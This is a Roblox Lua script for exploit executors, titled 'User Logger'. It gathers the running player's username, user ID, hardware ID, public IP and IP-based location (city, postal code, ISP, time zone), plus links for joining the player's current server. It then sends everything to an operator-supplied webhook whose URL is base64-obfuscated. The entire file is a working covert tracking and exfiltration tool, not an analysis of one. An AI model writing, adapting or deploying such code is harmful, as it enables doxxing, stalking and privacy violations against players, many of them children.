-- Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local Hwid = RbxAnalyticsService:GetClientId()
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

-- Base64 Decoding Function
local function base64Decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Helper Functions
local function safeHttpGet(url)
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)
    if success then
        return response
    else
        warn("Failed to retrieve data from " .. url)
        return nil
    end
end

local function detectExecutor()
    if identifyexecutor then
        return identifyexecutor()
    else
        return "Unknown Executor"
    end
end

local function formatPlayerLink(userId)
    return "https://www.roblox.com/users/" .. userId
end

local function formatGameLink(placeId)
    return "https://www.roblox.com/games/" .. placeId
end

-- Obfuscated Webhook URL
local encodedWebhookUrl = "Enter Encrypted Webhook Here (Base64)"
local webhookUrl = base64Decode(encodedWebhookUrl)

-- Data Retrieval
local GetIp = safeHttpGet("https://v4.ident.me/")
local GetData = safeHttpGet("http://ip-api.com/json")
local IpData = GetData and HttpService:JSONDecode(GetData) or {}

-- Webhook Data Creation
local function createWebhookData()
    local executor = detectExecutor()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local playerLink = formatPlayerLink(UserId)
    local gameLink = formatGameLink(game.PlaceId)
    local mobileJoinLink = formatGameLink(game.PlaceId) .. "/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
    local jobIdLink = formatGameLink(game.PlaceId) .. "?jobId=" .. game.JobId
    local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
    local GameName = GameInfo.Name

    local data = {
        username = "User Logger",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {
            {
                title = "🎮 Game Information",
                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
                color = tonumber("0x2ecc71")
            },
            {
                title = "👤 Player Information",
                description = string.format(
                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
            },
            {
                title = "🌐 Location & Network",
                description = string.format(
                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
                    GetIp or "Unavailable", Hwid, IpData.country or "Unknown", string.lower(IpData.countryCode or ""), 
                    IpData.regionName or "Unknown", IpData.city or "Unknown", IpData.zip or "Unknown", 
                    IpData.isp or "Unknown", IpData.org or "Unknown", IpData.timezone or "Unknown"
                ),
                color = tonumber("0xe74c3c")
            },
            {
                title = "⚙️ Technical Details",
                description = string.format(
                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
                    executor, jobIdLink, mobileJoinLink
                ),
                color = tonumber("0x95a5a6"),
                footer = { text = string.format("📅 Date: %s | ⏰ Time: %s", date, time) }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Send Webhook Function
local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    
    local success, result = pcall(function()
        return request(webhookRequest)
    end)
    
    if success and result.StatusCode == 200 then
        print("Webhook sent successfully.")
    else
        warn("Failed to send webhook: " .. (result and result.StatusMessage or "Unknown error"))
    end
end

-- Execute
local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)
